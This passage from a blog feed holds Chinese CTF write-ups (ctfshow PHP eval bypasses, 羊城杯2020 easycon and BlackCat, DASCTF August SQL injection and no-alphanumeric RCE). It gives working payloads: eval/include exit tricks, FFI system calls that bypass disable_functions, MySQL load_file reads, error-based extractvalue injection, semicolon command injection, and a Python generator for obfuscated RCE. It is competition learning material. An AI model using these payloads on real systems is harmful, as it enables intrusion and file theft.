class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的代码做出了小变化</p><p>可以看到这里会把读到的内容放到内存当中，并且会输出进行了正则替换后的内容，还是有方法进行绕过，让程序提前结束退出即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">exit</span>();||c=<span class="keyword">include</span>(<span class="string">"/flag.txt"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><h3 id="web72-看-yu-师傅的blog"><a href="#web72-看-yu-师傅的blog" class="headerlink" title="web72(看_yu_师傅的blog)"></a>web72(看_yu_师傅的blog)</h3><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h3><h3 id="web75-web76"><a href="#web75-web76" class="headerlink" title="web75-web76"></a>web75-web76</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   <span class="comment">//过75,76</span></span><br><span class="line">读取目录</span><br><span class="line">$a=<span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">' '</span>);&#125;;</span><br><span class="line"></span><br><span class="line">读取文件</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  $dbh = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">  <span class="keyword">foreach</span>($dbh-&gt;query(<span class="string">'select load_file("/var/www/html/index.php")'</span>) <span class="keyword">as</span> $row) &#123;</span><br><span class="line">      <span class="keyword">echo</span>($row[<span class="number">0</span>]).<span class="string">"|"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $dbh = <span class="keyword">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException $e) &#123;</span><br><span class="line">  <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">$FFI读取</span><br><span class="line">c=$ffi = FFI::cdef(<span class="string">"int system(char *command);"</span>, <span class="string">"libc.so.6"</span>);$a=<span class="string">'/readflag &gt; xxx.txt'</span>;$ffi-&gt;system($a);<span class="keyword">exit</span>();   <span class="comment">//访问xxx.txt</span></span><br><span class="line">放一篇文章：https:<span class="comment">//www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;command绕过&quot;&gt;&lt;a href=&quot;#command绕过&quot; class=&quot;headerlink&quot; title=&quot;command绕过&quot;&gt;&lt;/a&gt;command绕过
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020</title>
    <link href="http://yoursite.com/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/"/>
    <id>http://yoursite.com/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</id>
    <published>2020-09-11T05:49:10.000Z</published>
    <updated>2020-09-11T06:28:32.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结<a id="more"></a></h3><p>这次比赛，做了俩web，有一道web总感觉差点，一个人打很吃力，没队友交流思路，自己还是能力欠缺了，总归还是有收获的</p><h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ul><li>小马</li><li>base64本地转图片</li></ul><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>开题</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/1.png" class=""><p>就是一个apache的配置信息，直接改访问index.php</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/2.png" class=""><p>提示post一个cmd过去，看一下网页源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">div</span><span class="selector-class">.main</span> &#123; <span class="attribute">margin-left</span>:auto; <span class="attribute">margin-right</span>:auto;  &#125; <span class="selector-tag">body</span> &#123; <span class="attribute">background-color</span>: <span class="number">#FAEBA7</span>; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw2.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'eval post cmd'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>猜测是一个可以连接的shell，直接拿蚁剑连接</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/3.png" class=""><p>连上后找了根目录，没有找到flag，发现在web服务目录下还有一个txt文件，下载到本地，base64解码可以看到jfif猜测是图片，但是解的码不能还原成图片，想到之前做过的题目，在浏览器打开时也是这样的形式，自己本地写一个</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">&lt;&lt;img src="data:image/png;base64,xxxxxxxxxxxxxx" alt=""&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把txt文件中的内容替换在xxxxxxxx处即可，再本地起一下网页</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/4.png" class=""><p>flag到手</p><h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><ul><li>strings命令</li><li><code>hash_hmac</code>绕过</li></ul><h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>开题</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/5.png" class=""><p>查看网页源代码，提示听歌，直接把歌下过来，丢到kali里，用strings命令看一下</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/6.png" class=""><p>可以看到最后有源码，撕下来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'谁！竟敢踩我一只耳的尾巴！'</span>);</span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure><p>要想执行后面的exec，就得绕过这个判断</p><p>查找资料，本地调试，发现 <code>hash_hmac()</code>函数传入的第二个参数为数组时会返回NULL，那也就是说加密之后的<code>$clandestine</code>可控了，加上<code>$One-ear</code>和<code>$Black-Cat-Sheriff</code>都可控，那就简单了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$clandestine = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'2'</span>], $clandestine);</span><br><span class="line">var_dump($clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'1'</span>], $clandestine);</span><br><span class="line">var_dump($hh);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地进行加密，再进行传参，这里的<code>nc</code>开始我以为要谈个shell到本地，试了一下不行，后来发现<code>;</code>可以阻断<code>nc</code>命令，后面拼接自己想要使用的命令，这里由于返回结果只有一行，所以用<code>find</code>命令查找flag文件即可，直接给最后的结果图</p><img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/7.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结
    
    </summary>
    
    
    
      <category term="羊城杯" scheme="http://yoursite.com/tags/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>DASAugust</title>
    <link href="http://yoursite.com/2020/09/05/DASAugust/"/>
    <id>http://yoursite.com/2020/09/05/DASAugust/</id>
    <published>2020-09-05T07:53:00.000Z</published>
    <updated>2020-09-06T12:26:04.741Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安恒大学"><a href="#安恒大学" class="headerlink" title="安恒大学"></a>安恒大学<a id="more"></a></h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><ul><li>SQL报错注入</li><li>注入点</li></ul><h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题是一个登录界面</p><img src="/2020/09/05/DASAugust/1.png" class=""><p>可以注册，并且真实发送邮箱激活的邮件，开始没注意这里，后面再说</p><p>激活之后就可以登录了</p><img src="/2020/09/05/DASAugust/2.png" class=""><p>可以看到这个教务系统有很多的功能，比赛那天找了挺久找不到利用的地方， 又没有像是模板注入的点</p><p>赛后看师傅的wp就是在前面的发送邮箱激活的地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;pegggg&amp;token&#x3D;6011b0c07969fccb63b51daeaf1a4180</span><br></pre></td></tr></table></figure><p>这里的username就是注入点，之后就是常规的报错注入，先来看一下数据库</p><img src="/2020/09/05/DASAugust/3.png" class=""><p>下面就是看表和列名了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先查表名</span><br><span class="line">1'and extractvalue(0x0a,concat(0x0a,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())))<span class="comment">--+</span></span><br><span class="line"><span class="comment">#XPATH syntax error: ' student,teachers,users'</span></span><br><span class="line"></span><br><span class="line">可以看到有三个表，一个个看</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,<span class="keyword">password</span>,ip,<span class="built_in">time</span>,US<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'teachers'</span>)))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' id,f1aaaag'</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,concat(0x0a,(select group_concat(column_name) from information_schema.columns where table_name='</span>student<span class="string">')))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span> <span class="keyword">id</span>,username,age,sex<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">找到了flag字段，就查teachers那张表就行</span></span><br><span class="line"><span class="string">这里很明显有长度限制，并且要注意，这里有很多假的flag数据，需要逐条查询，用limit</span></span><br><span class="line"><span class="string">1'</span><span class="keyword">and</span> extractvalue(<span class="number">0x0a</span>,<span class="keyword">substr</span>((<span class="keyword">concat</span>(<span class="number">0x0a</span>,(<span class="keyword">select</span> f1aaaag <span class="keyword">from</span>  <span class="number">51</span>zxw.teachers <span class="keyword">limit</span> <span class="number">11</span>,<span class="number">1</span>))),<span class="number">1</span>,<span class="number">40</span>))<span class="comment">--+</span></span><br><span class="line">XPATH syntax <span class="keyword">error</span>: <span class="string">' DASCTF&#123;5af8b8860434db2184a427ee'</span></span><br><span class="line"><span class="number">1</span><span class="string">'and extractvalue(0x0a,substr((concat(0x0a,(select f1aaaag from  51zxw.teachers limit 11,1))),5,38))--+</span></span><br><span class="line"><span class="string">XPATH syntax error: '</span>af8b8860434db2184a427ee1fe6b845&#125;<span class="string">'</span></span><br></pre></td></tr></table></figure><img src="/2020/09/05/DASAugust/5.png" class=""><img src="/2020/09/05/DASAugust/4.png" class=""><p>把上面的两部分flag去重拼接就可以了</p><p>这里也可以用reverse倒叙输出来拿到后面部分的flag，再进行拼接</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><ul><li>无字母数字RCE</li><li>数字构造</li></ul><h3 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h3><p>开题放送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>既然是赛后复现，那肯定是看了wp的</p><p>这里可以利用被过滤的字母数字存放的数组来进行构造</p><p>此外，数组肯定是要有下标的，然后利用递增取到想要的内容，这里用的是<code>(&quot;!=&quot;!=&quot;==&quot;)</code>，这显示为真，php中打印的结果为1，之后通过累加就能拿到不同的数字了，直接上exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"><span class="keyword">list</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'~'</span>,<span class="string">'^'</span>,<span class="string">'['</span>,<span class="string">']'</span>,<span class="string">'&amp;'</span>,<span class="string">'?'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>]</span><br><span class="line">long = len(<span class="keyword">list</span>)</span><br><span class="line">str1 = <span class="string">'system'</span></span><br><span class="line">str2 = <span class="string">'cat /flag'</span></span><br><span class="line">strings=<span class="string">''</span></span><br><span class="line">strings += <span class="string">"$__="</span></span><br><span class="line"><span class="keyword">for</span> j in str1:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    </span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">');'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">"$___="</span></span><br><span class="line"><span class="keyword">for</span> j in str2:</span><br><span class="line">    <span class="keyword">if</span> j in <span class="keyword">list</span>:</span><br><span class="line">        strings += <span class="string">'$_&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">list</span>.index(j) ==<span class="number">0</span>:</span><br><span class="line">            strings += <span class="string">'("!="!="!=")&#125;.'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> i in range(<span class="number">0</span>,<span class="keyword">list</span>.index(j)):</span><br><span class="line">                strings += <span class="string">'("!="!="==")+'</span></span><br><span class="line">            strings = strings[:<span class="number">-1</span>]</span><br><span class="line">            strings += <span class="string">'&#125;.'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strings+=<span class="string">"\""</span>+j+<span class="string">"\"."</span></span><br><span class="line">    <span class="comment"># print(strings)</span></span><br><span class="line">strings=strings[:<span class="number">-1</span>]+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line">strings += <span class="string">'$__($___);//'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(strings)</span><br></pre></td></tr></table></figure><p>还是很好懂的，这里就不解释了，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)&#125;.$_&#123;(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&quot;)+(&quot;!&#x3D;&quot;!&#x3D;&quot;&#x3D;&#x3D;&q